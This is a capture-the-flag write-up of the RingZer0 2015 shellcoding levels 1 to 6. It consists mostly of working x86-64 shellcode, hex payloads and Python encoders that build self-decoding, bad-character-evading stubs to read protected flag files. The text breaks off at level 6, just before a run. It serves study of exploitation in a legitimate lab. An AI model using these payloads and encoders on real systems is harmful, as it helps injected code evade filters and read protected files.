---
layout: post
title: "RingZer0 2015 CTF Shellcoding"
date: 2015-02-12 01:38:30 -0500
author: [barrebas]
comments: true
categories: [ringzer0]
---

### Solved by barrebas

[RingZer0Team](http://ringzer0team.com) is hosting a long-term CTF. The shellcoding challenges presented a very nice set of challenges. It was really fun **and** I learned a ton about 64-bit shellcoding while solving them!

I have redacted all the flags, because that would spoil things a bit too much. I did, however, try to verify all the shellcodes that are presented here. Sometimes, filenames may not match or errors may have creeped into the scripts during clean-up. For this, my apologies ;)

Level 1
-------

Let's start easy. Upon connecting via `ssh`, the challenge presents us with the following:

```
$ ssh level1@shellcode.ringzer0team.com -p 7771
level1@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37

RingZer0 Team CTF Shellcoding Level 1
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have no shellcode restriction.
You main goal is to read /flag/level1.flag

shellcode>
```

Although it says *no restriction*, there is one crucial restriction: NULL bytes are **not** allowed. This probably means that the shellcode is being copied to a buffer by `strcpy` or something similar. I found this out the hard way... Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this [x64 syscall table](http://blog.rchapman.org/post/36801038863/linux-system-call-table-for-x86-64) which lists all the syscalls and the arguments. 

To avoid NULL bytes, registers can be zeroed by using `xor`. To set a byte-sized value, the value can be `push`ed and then `pop`ped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.

```
bits 64

_start:

mov dword [rsp], '/fla'     ; build filename on stack
mov dword [rsp+4], 'g/le'
mov dword [rsp+8], 'vel1'
mov dword [rsp+12], '.fla'
push 'g'
pop rcx
mov [rsp+16], ecx

lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
xor rax, rax
inc rax
inc rax                     ; syscall open = 2
syscall 

mov rbx, rax                ; filehandle of opened file

lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
mov rdi, rbx                ; rbx was the filehandle
push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
pop rdx
xor rax, rax                ; syscall read = 0
syscall

lea rsi, [rsp]              ; the contents of the file were on the stack
xor rdi, rdi
inc rdi                     ; filehandle; stdout!
mov rdx, rax                ; rax was amount of bytes read by syscall read
xor rax, rax
inc rax
syscall                     ; syscall write = 1

push byte 60                ; some bytes left...
pop rax                     ; exit cleanly
syscall

```

To assemble and generate the shellcode in the format which the challenge wants, I used this command:

```bash
$ echo; nasm -f bin ./level1-nonulls.asm; xxd -c 1 ./level1-nonulls | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level1-nonulls

\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
100 ./level1-nonulls
```

It spits out the shellcode, ready for copy & paste, along with the size of the shellcode. Running it versus the server yields the flag!

Level 2
-------

The password for level 2 is the flag of level 1. It seems the ante has been upped:

```
RingZer0 Team CTF Shellcoding Level 2
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x99" max size 50 bytes.
You main goal is to read /flag/level2.flag
```

So the previous shellcode goes right out the window. I needed to cut it in half, length-wise. Also, not all characters are allowed, so-called *bad chars*. This will restrict the instructions we can use in the shellcode. Let's have a look at how we can trim the fat off of the shellcode of level 1.

First, hard-coding the filename is out of the question. That would waste at least 18 bytes, or 36% of the shellcode. Furthermore, it would contain the bad char `0x2f` which is the slash `/`. Instead, I decided to read in the name of the file with a syscall; the rest of the shellcode then takes care of opening that file, reading from it and sending the bytes back to us.

```
bits 64

_start:
xor rax, rax        ; syscall read = 0
xor rdi, rdi        ; we'll read from stdin
mov rsi, rsp        ; one byte shorter than 'lea rsi, [rsi]'
push byte 18        ; number of bytes to read, enough for the filename
pop rdx
syscall 

xor rax, rax
inc rax
inc rax             ; syscall open
                    ; instead of setting rdi to the filename (located on the stack),
                    ; we re-use the fact that rdi is zero and rsi points to that filename
xchg rsi, rdi       ; now rsi = 0 (O_RDONLY), and rdi points to the filename we just read
syscall

xchg rax, rsi       ; after this, rsi contains the filehandle of the opened file, rax contains 0
xchg rdi, rsi       ; after this, rdi contains the filehandle and rsi points to the stack (a buffer!)
push byte 127
pop rdx             ; read 127 bytes, should be plenty
syscall             ; because we set rax to 0, this will call syscall read

xor rax, rax
inc rax             ; syscall write
mov rdi, rax        ; copy the value of rax to rdi (1 = stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; grab the flag!
```

Assembling the shellcode is done with the previous command. No bad chars made it into the shellcode, and we have one byte to spare!

```
$ echo; nasm -f bin ./level2-shellcode.asm; xxd -c 1 ./level2-shellcode | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level2-shellcode

\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
49 ./level2-shellcode
```

Running it on the server:

```bash
shellcode>\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x6a\x12\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x48\x87\xf7\x0f\x05\x48\x96\x48\x87\xfe\x6a\x7f\x5a\x0f\x05\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x0f\x05
    Shellcode received...
    Shellcode length (49) bytes.

    Success: Executing shellcode...

/flag/level2.flag^@
FLAG-<redacted>
    Error: SIGSEGV received I think your shellcode is not working
```

After succesfully executing the shellcode, it demands input on stdin. Specifically, it needs the filename which we want to read. Notice that the filename is terminated with a NULL byte: this can be done by typing in the correct filename and then pressing `Ctrl+Space` to send a NULL byte. When done, pressing enter will yield the flag!

Level 3
-------

```bash
This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\x2e\x62\x48\x98\x99\x30\x31" max size 50 bytes.
You main goal is to read /flag/level3.flag
```

Again, fifty bytes maximum shellcode length, but more bad chars have been added. Unfortunately, the bad chars `0x48` and `0x31` make the use of `xor rax, rax` and the like impossible! Instead, to zero a register, something like this can be done:

```
push byte 1     ; 0x6a, 0x01
pop rbx         ; 0x5b
dec bl          ; 0xff
```

This effectively clears `rbx`. This register also typically keeps it's original value after a syscall (it's non-volatile), so it's a good place to store something we'll use more often. 

Furthermore, I like to use `xchg` to swap around contents of registers. However, if this is done on full 64-bit registers, the assembler generates a `0x48` byte, which is a bad char. Instead, the values can be passed around via the stack:

```
; instruction   ; opcode
; --------------|-------
push rax        ; 0x50
push rbx        ; 0x53
pop rax         ; 0x58
pop rbx         ; 0x5b
```

The effect of this is that `rax` now contains the value of `rbx` and vice-versa. Without further ado, the shellcode for level 3:

```
bits 64

_start:

push byte 1
pop rbx
dec bl              ; rbx is now zeroed out, avoiding the bad chars 0x31 and 0x48. 

push rbx
pop rax             ; rax is now zeroed out too. 

push rbx
pop rdi             ; stdin is zero, so zero out rdi as well

push rsp            ; make rsi point to the top of the stack
pop rsi             ; the buffer for syscall read

push byte 18        ; read in 18 bytes
pop rdx
syscall

push rbx
pop rax
inc al
inc al              ; syscall open

;xchg rsi, rdi      ; we cannot use this xchg opcode because of 0x48!
push rdi            ; instead, do the exchange of rsi and rdi via the stack
push rsi
pop rdi             ; rdi is now pointing to the filename on the stack
pop rsi             ; rsi is now zero (flag O_RDONLY)

syscall
                    ; pull a similar trick here, swapping around three registers
push rax            ; fd of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 syscall read
pop rdi             ; rdi = fd

push byte 127
pop rdx             ; amount of bytes to read
syscall             ; syscall read

push rbx
pop rax
inc al              ; syscall write
push rax            ; copy rax (==1) to rdi
pop rdi             ; 1 = stdout
                    ; rsi = still pointing to buffer with contents of file
                    ; rdx = still 0x7f
syscall
```

Assembling it:

```bash
$ echo; nasm -f bin ./shellcode3.asm; xxd -c 1 ./shellcode3 | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./shellcode3

\x6a\x01\x5b\xfe\xcb\x53\x58\x53\x5f\x54\x5e\x6a\x12\x5a\x0f\x05\x53\x58\xfe\xc0\xfe\xc0\x57\x56\x5f\x5e\x0f\x05\x50\x56\x57\x5e\x58\x5f\x6a\x7f\x5a\x0f\x05\x53\x58\xfe\xc0\x50\x5f\x0f\x05
47 ./shellcode3
```

Haha! No bad chars *and* three bytes to spare! 


Level 4
-------

I wasn't laughing anymore once I saw the restrictions placed on the shellcode of level 4:

```
This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
```

This bans the use of `syscall`, which assembles to `0x0f, 0x05`. In theory, I think `int 0x80` (`cd 80`) could be used, but I haven't verified. The shellcode needs to be obfuscated and decoded at runtime somehow. I decided to make a very simple encoding & decoding system: the bytes are simply increased by one. At runtime, a small stub of code is responsible for decrementing each byte to it's proper value. 

I've made use of a cool trick available on the 64-bit architecture: RIP-relative addressing. Normally, to get the address at which something is running, we'd do this:

```
jmp _over_the_shellcode         ; jmp short, assembles to 0xeb + 8 bit signed displacement

_getInstructionPointer:
pop rbx                         ; rbx now contains the address of _location

; ...shellcode bytes...

_over_the_shellcode:
call _getInstructionPointer     ; call backward, assembles to 0xe8 and a 32 bit signed displacement

_location:
```

However, this `jmp/call/pop` sequence to get the current location of code would introduce `0xff` bytes due to the relative call backwards. We can't use this, but luckily RIP-relative addressing comes to the rescue!

```
lea rax, [rel _shellcode]    ; notice the use of the rel keyword!

_shellcode:
```

Again, however, due to the nature of this instruction (it uses a 32-bit displacement value) this would introduce NULL bytes. Instead, I decided to offset the value with a constant and then subtracting that constant. Finally, I needed to select a proper register. I settled on `r14`, because `rax` through `rdi` would introduce bad chars, and so would `r15`. 

The decoder looks like this:

```
bits 64


default rel                         ; we'll use relative addressing to get RIP

_start:
                                    ; we use r14, because this will avoid the 0x48 byte
                                    ; lea eax/ecx etc emits 0x48
lea r14, [rel _shellcode+0x12345678]; we can't use it directly, because of null bytes.
sub r14, 0x12345678                 ; restore the value in r14, so it points to the encoded shellcode.

push byte 43                        ; put amount of bytes to decode
pop rcx                             ; in rcx

_decode:
dec byte [r14]                      ; start at r14 (_fakecall)
add r14, 1                          ; 'decode' by adding 1
loop _decode                        ; decode `ecx` bytes.

_shellcode:                         ; place 'encoded' shellcode here
```

The actual shellcode is nearly the same one used above. It reads in the name of the file you want to read (terminate with `^@` or `0x00` by typing Ctrl+space). It then opens that file, reads from it, storing the data on the stack. It finally writes the contents of the file back to us.

```
bits 64

_start:

push byte 0         ; we can use 0 here because we add 1 to each 
                    ; byte in the shellcode to 'encode' it.
pop rbx             ; store this value in rbx. We'll re-use it later.
push rbx            ; copy rbx...
pop rax             ; ...to rax. rax is now 0, the syscall for 'read'
push rbx            ; copy rbx...
pop rdi             ; ...to rdi: fd = stdin 
push rsp            ; copy rsp to rsi
pop rsi             ; rsi is the buffer to which we read the filename to open
                    
push byte 18        ; the filename will be 18 bytes long
pop rdx             ; amount of byte to read
syscall             ; read in the filename

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 2           ; syscall open. I had to use the xor here to avoid badchars after encoding this shellcode.
push rdi            ; switch around some registers. rdi = 0
push rsi            ; rsi = pointer to filename
pop rdi             ; rdi now points to filename to open
pop rsi             ; rsi = 0, which is O_RDONLY
syscall             ; open file

                    ; switch around the registers again. 
                    ; have to use the push/pops, because `xchg` would generate a badchar after encoding.
push rax            ; filehandle of just opened file
push rsi            ; rsi = 0
push rdi            ; rdi = pointer to top of stack
pop rsi             ; rsi = buf
pop rax             ; rax = 0 (syscall read)
pop rdi             ; rdi = filehandle
push byte 127       ; amount of bytes to read
pop rdx             ; in rdx
syscall             ; read in the contents of the file

push rbx            ; rbx is still 0
pop rax             ; zero out rax
xor al, 1           ; syscall write
push rax            ; copy rax to rdi
pop rdi             ; filehandle = 0 (stdout)
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write to stdout; get me the flag!
ret                 ; return to handler program
```

Now, I could assemble these two shellcode pieces with `nasm`:

```
$ nasm -f bin ./decoder.asm
$ nasm -f bin ./shellcode.asm
```

Then I wrote a small python program to do the actual encoding of the shellcode:

```python
payload = ''

# read in the decoder
with open('decoder') as decoder:
    data = decoder.read()
    for i in data:
        payload += "\\x%02x" % ord(i)
    decoder.close()

# read in the shellcode & encode it
with open('shellcode') as sc:
    data = sc.read()
    # for each byte, we add 1 to it and emit it.
    for i in data:
        payload += "\\x%02x" % (ord(i) + 1)
    sc.close()

# spit out payload!
print payload
```

After running this python script, I ended up with the completed shellcode:

```python
$ python ./encode.py 
\x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4
```

As you can see, there are no badchars in this shellcode. We can send it over and grab the flag!

```bash
RingZer0 Team CTF Shellcoding Level 4
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x48" max size 80 bytes.
You main goal is to read /flag/level4.flag

shellcode>\x4c\x8d\x35\x8b\x56\x34\x12\x49\x81\xee\x78\x56\x34\x12\x6a\x2b\x59\x41\xfe\x0e\x49\x83\xc6\x01\xe2\xf7\x6b\x01\x5c\x54\x59\x54\x60\x55\x5f\x6b\x13\x5b\x10\x06\x54\x59\x35\x03\x58\x57\x60\x5f\x10\x06\x51\x57\x58\x5f\x59\x60\x6b\x80\x5b\x10\x06\x54\x59\x35\x02\x51\x60\x10\x06\xc4
    Shellcode received...
    Shellcode length (70) bytes.

    Success: Executing shellcode...

/flag/level4.flag^@
FLAG-<redacted>
Connection to shellcode.ringzer0team.com closed.
```

Level 5
-------

Of course, level 5 increases the bad char list even further...

```
Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68" and \x40 to \x65 max size 100 bytes.
```

We can no longer use the relative addressing with `lea`, because of the bad chars `0x49` and `0x48`. In fact, I was unable to get the address of the shellcode via any techniques I know. 

I assumed that this shellcode is being executed via a instruction like `call rax`. That means that `rax` would still contain the pointer to the shellcode. If this is the case, we can re-use the value in `rax` as an index to the shellcode and use it to carve out the 'real' shellcode via `xor` instructions. But let's first test this hypothesis. Time to get creative! 

I made a small piece of shellcode that tests this hypothesis:

```
bits 64

default rel

_start:
xor dword [rax+_temp-_start], 0x3d283d28        ; the xor will change the rets to jmp $-2!

nop
nop
nop
nop
nop
nop
nop

_temp:
ret
ret
ret
ret
```

When this code executes, the `xor` instruction should change the `ret` instructions to `jmp $-2`, or infinite loops (this works, because `c3 c3 c3 c3 xor 28 3d 28 3d` translates to `eb fe eb fe`). If `rax` does not point to the shellcode, I might get a SIGSEGV or the code simply exits. 

Compiling it and sending it over, however, makes the program hang! This must means that the `ret`s were changed into `jmp` instructions, proving the hypothesis. We can use `rax` as a pointer to the shellcode! Now, we need to carve out the actual shellcode and execute it. I chose to use the same `xor` strategy. I made the `read/open/read/write` shellcode a lot smaller, managing to bring it down to 31 bytes. It contains bad chars again, but that's okay because I'm gonna encode it anyway:

```
bits 64

_start:

xor rax, rax        ; syscall read
push rax
pop rdi             ; rdi: fd = stdin 
push rsp
pop rsi             ; rsi points to stack, aka a buffer
push byte 127
pop rdx             ; read 127 bytes
syscall

mov al, 2           ; open; because we read less than 128 bytes, the rest of rax/eax/ax/ah will contain zeroes.
xchg rsi, rdi       ; rsi is now zero (O_RDONLY) and rdi points to the filename on the stack
syscall             ; open the file

xchg rax, rdi       ; after this, rax = pointer to the stack, rdi = filehandle
xchg rax, rsi       ; after this, rax = 0, rsi = pointer to the stack
syscall             ; read

mov al, 1           ; again, less than 128 bytes will be read
push rax
pop rdi             ; fd = stdout
                    ; rsi = still pointer to buffer
                    ; rdx = still 0x7f
syscall             ; write out contents of flag to stdout!
```

Next, I needed to carve out this shellcode using `xor` instructions. These instructions must not contain bad chars. Luckily, `xor dword ptr [rax+offset]` itself does not contain bad chars, or they can be avoided.

```python
import struct

''' this function will try to locate a combination of two bytes that, when
    xor'ed, yield the required byte.
'''
def find_xor_bytes(b):
    for i in range(256):
        if i not in badchars:
            if ord(b) ^ i not in badchars:
                # return the two bytes that encode the required byte
                return chr(i), chr(ord(b) ^ i)
    print "cannot find proper byte for {}".format(b)
    exit(-1)
    
# build the bad char lookup array.
badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
for i in range(0x40, 0x65):
    badchars.append(i)
# I got a bit paranoid and decided that these bytes were badchars too
for i in range(0x1, 0xf):
    badchars.append(i)
    
# read in the shellcode that we need to encode.
with open('modified-shellcode3') as sc:
    data = sc.read()
    sc.close()

# pad out the shellcode to a multiple of four
while len(data) % 4:
    data += "\xc3"

# ill-named variables to hold the encrypted bytes
storage = ''
encoded_bytes = ''
commands = ''
defines = ''
num_commands = 0

# iterate over each byte in the shellcode
for b in data:
    # try to find two bytes that are not badchars themselves
    (b1, b2) = find_xor_bytes(b)
    # store those bytes
    storage += b1
    encoded_bytes += b2
    # if there are four bytes stored, add them to the output & start again
    if len(storage) == 4:
        # emit 
        commands += "xor dword [rax+_shellcode{}-_shellcode], {}\n".format(num_commands, hex(struct.unpack('<L', storage)[0]))
        defines += "_shellcode{} dd {}\n".format(num_commands, hex(struct.unpack('<L', encoded_bytes)[0]))
        storage = ''
        encoded_bytes = ''
        num_commands += 1
                
# output the resulting assembly 
print """bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
"""
print defines
print "_decoder:"
print commands
print "jmp _shellcode0"

```

This output the encoded shellcode as an assembly file. Using `nasm`, I could build it into shellcode again. For local testing, I included a call to `mprotect` and set the value of `rax` to the start of the shellcode, just like the situation on the remote server. The layout of the built shellcode (first encrypted bytes, then the decoder) is done on purpose: it avoids bad chars in the `xor dword [rax+offset]` instructions. The value for the offset should not be too high, as that would introduce bytes in the range `0x40` to `0x65`...

```
bits 64
_start:

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall
;lea rax, [_decoder]

_shellcode:
jmp _decoder
_shellcode0 dd 0x70d02169
_shellcode1 dd 0x7a7e747f
_shellcode2 dd 0x151f7a6f
_shellcode3 dd 0x976912a0
_shellcode4 dd 0x69151fe7
_shellcode5 dd 0x1f866987
_shellcode6 dd 0x7011a015
_shellcode7 dd 0xd3151f7f

_decoder:
xor dword [rax+_shellcode0-_shellcode], 0x20101021
xor dword [rax+_shellcode1-_shellcode], 0x10202020
xor dword [rax+_shellcode2-_shellcode], 0x10102010
xor dword [rax+_shellcode3-_shellcode], 0x10211010
xor dword [rax+_shellcode4-_shellcode], 0x21101010
xor dword [rax+_shellcode5-_shellcode], 0x10102110
xor dword [rax+_shellcode6-_shellcode], 0x20101010
xor dword [rax+_shellcode7-_shellcode], 0x10101020

jmp _shellcode0
```

Feeling quite chuffed, I assembled it and checked for bad chars... there was one! A `0x0a` byte snuck in. This was because the addresses of the encoded dwords were, relative to `rax`: 2, 6, 10, 14, etc. I needed to add an offset, which I did:

```
_shellcode:
jmp _decoder
nop
nop
```

This took care of the problem. Yes, this shellcode could have been shorter, probably. A lot of the constants look similar, so I could have probably made the decoder smaller by selecting a 'magic' constant. However, it worked!

```bash
$ echo; nasm -f bin ./completed2.asm; xxd -c 1 ./completed2 | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./completed2

\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6
94 ./completed2

$ ssh level5@shellcode.ringzer0team.com -p 7771level5@shellcode.ringzer0team.com's password: 
Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
Last login: Thu Feb  5 17:23:29 2015 from 137.224.219.201

RingZer0 Team CTF Shellcoding Level 5
Submit your shellcode using hex representation "\xcc\xcd".
Type "end" to exit.

This level have shellcode restriction. Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x65" max size 100 bytes.
You main goal is to read /flag/level5.flag

shellcode>\xeb\x22\x90\x90\x69\x21\xd0\x70\x7f\x74\x7e\x7a\x6f\x7a\x1f\x15\xa0\x12\x69\x97\xe7\x1f\x15\x69\x87\x69\x86\x1f\x15\xa0\x11\x70\x7f\x1f\x15\xd3\x81\x70\x04\x21\x10\x10\x20\x81\x70\x08\x20\x20\x20\x10\x81\x70\x0c\x10\x20\x10\x10\x81\x70\x10\x10\x10\x21\x10\x81\x70\x14\x10\x10\x10\x21\x81\x70\x18\x10\x21\x10\x10\x81\x70\x1c\x10\x10\x10\x20\x81\x70\x20\x20\x10\x10\x10\xeb\xa6
    Shellcode received...
    Shellcode length (94) bytes.

    Success: Executing shellcode...

/flag/level5.flag^@
FLAG-<redacted>
    Error: SIGSEGV received I think your shellcode is not working.
```

Level 6
-------

```
Bad char list "\x0a\x0d\x2f\xff\x0f\x05\x68 and \x40 to \x81" max size 90 bytes.
```

Things are beginning to look grim! Every time I came up with a solution, the next level would list one or more crucial bytes as a bad char. This time, `0x81` became a bad char, blocking the use of the `xor`. 

I turned again to the gigantic table over at [ref.x64asm.net](http://ref.x86asm.net/coder64.html). I flipped through the list of available opcodes, looking for things that would allow me to decode and carve out the shellcode. Finally, my eyes caught the floating point instructions. One of the variants allows the use of integers as arguments for floating point operations:

```
fild dword [rax+rbx*4]
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
```

These instructions do not contain bad chars! Furthermore, they allow the use of `rax` as a pointer to the shellcode, enabling us to carve out stage 1. I used a similar trick as in level 5 to check the viability of this technique:

```
bits 64

_start:
jmp _decode
nop
nop                     ; align the encoded shellcode to a dword boundary

_stage1:

_0 dd 0xc3c3c3c3        ; these rets should be transformed into jmp $-2
_1 dd 0x90909090
_2 dd 0x90909090
_3 dd 0x90909090
_4 dd 0x90909090
_5 dd 0x90909090
_6 dd 0x90909090

_8 dd 0x3b283b28        ; funny enough, the constant for the add is the same as for the xor!
_9 dd 0x90909090
_a dd 0x90909090
_b dd 0x90909090
_c dd 0x90909090
_d dd 0x90909090
_e dd 0x90909090

_decode:                ; i'd call this stage 0
xor ecx,ecx             ; clear ecx and rcx
xor ebx,ebx             ; clear ebx
mov cl, (_6-_start)/4   ; starting dword for shellcode 
mov bl, (_e-_start)/4   ; starting dword for decoding constants
_decodeloop:
fild dword [rax+rbx*4]  ; load integer into st0
dec bl
fiadd dword [rax+rcx*4] ; add constant to st0
fistp dword [rax+rcx*4] ; store integer at this position, effectively decoding the instructions
loop _decodeloop        ; use the fact that rcx is now an index and a counter

jmp _stage1             ; jump to -hopefully- decoded shellcode
```

Again, this hangs the remote program, confirming that this is a viable technique. I adjusted `encode.py` to generate the right constants. Prepare for some ultra-hacky python:

```python
import struct

carry = 0
def find_sub_bytes(byte_required):
    global carry
    b = ord(byte_required) - carry  # compensate for possible carry from previously encoded byte
    for i in range(256):
        if i not in badchars:
            c = b - i
            if (c & 0xff) not in badchars:
                carry = 0
                if c < 0:
                    carry = 1   # this carry is necessary, because the if the byte overflows, it is carried over to the next byte. 
                # return the two bytes that encode the required byte
                return chr(i), chr(c & 0xff)
    print "cannot find proper byte for {}".format(b)
    exit(-1)
        
badchars = [0x0, 0xa, 0xd, 0x2f, 0xff, 0xf, 0x5, 0x68]
for i in range(0x40, 0x82):
    badchars.append(i)
# paranoia!
for i in range(0x1, 0xf):
    badchars.append(i)
    
with open('shellcode') as sc:
    data = sc.read()
    sc.close()

storage = ''
encoded_bytes = ''
commands = ''
defines = ''
num_commands = 0

while len(data) % 4:
    data += "\x8f"
    
for b in data:
    (b1, b2) = find_sub_bytes(b)
    
    storage += b1
    encoded_bytes += b2
    if len(storage) == 4:
        # emit
        carry = 0   # clear carry, not necessary for next dword!
        commands += "_a{} dd {}\n".format(num_commands, hex(struct.unpack('<L', storage)[0]))
        defines += "_b{} dd {}\n".format(num_commands, hex(struct.unpack('<L', encoded_bytes)[0]))
        storage = ''
        encoded_bytes = ''
        num_commands += 1
                    
print """default rel
bits 64

;mov rax, 10
;mov rdi, 0x400000
;mov rsi, 0x1000
;mov rdx, 7
;syscall

;lea rax, [_start]

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder
"""
print commands
print defines
print """
_decoder:
xor ebx,ebx
mov cl, (_a{}-_start)/4
mov bl, (_b{}-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0

""".format(num_commands-1, num_commands-1)
```

This generated the following assembly:

```
bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _decoder

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0x10101120

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0xb2f4fe3f


_decoder:
xor ebx,ebx
mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:
fild dword [rax+rbx*4]
dec bl
fiadd dword [rax+rcx*4]
fistp dword [rax+rcx*4]
loop _decodeloop
jmp _a0
```

There was, however, a huge problem. The instruction `jmp _decoder` generated a bad char: `0x40`. This is because it has to jump over two times 32 bytes of data to reach the decoder, which is exactly 64 bytes. However, the shellcode is only 31 bytes long, while I store 32 bytes. That means that the last byte is redundant! I exploited this fact by making this final byte a NOP. But because it is used in the decoding process, I had to modify `encode.py` again. 

```python
while len(data) % 4:
    #data += "\xc3"
    data += "\x8f"  # found by trial & error ;)
```

This modifies the two last constants:

```
_a7 dd 0x90101120
...
_b7 dd 0xfef4fe3f
```

I switched them around, so that the last byte of _b7 would be the 0x90 byte. Then, I could jump there:

```
jmp _b7+3           ; assembles to eb 3f -> no more badchars!

...
_a7 dd 0xfef4fe3f
...
_b7 dd 0x90101120   ; this was 0xfef4fe3f (little endianess)
```

The working shellcode now looks like this:

```
bits 64

_start:
_stage0:                ; stage0 will carve out stage1 
xor ecx,ecx
jmp _b7+3               ; jump to the NOP, avoiding a bad char.

_a0 dd 0x11101010
_a1 dd 0x2b1f1520
_a2 dd 0x10111a82
_a3 dd 0x89101010
_a4 dd 0x10101110
_a5 dd 0x11101010
_a6 dd 0x10101010
_a7 dd 0xfef4fe3f

_b0 dd 0x3fb02138
_b1 dd 0x3f3f3f3f
_b2 dd 0xf4fe3ffd
_b3 dd 0xfe37f2a0
_b4 dd 0x37f4fee7
_b5 dd 0xfe863887
_b6 dd 0x3ff19ff5
_b7 dd 0x90101120

_decoder:
xor ebx,ebx

mov cl, (_a7-_start)/4
mov bl, (_b7-_start)/4
_decodeloop:    
fild dword [rax+rbx*4]  ; load integer
dec bl
fiadd dword [rax+rcx*4] ; do the actual decoding
fistp dword [rax+rcx*4] ; store the decoded bytes
loop _decodeloop        ; use rcx as counter and index
jmp _a0                 ; jump to decoded shellcode
```

Let's run it!

```
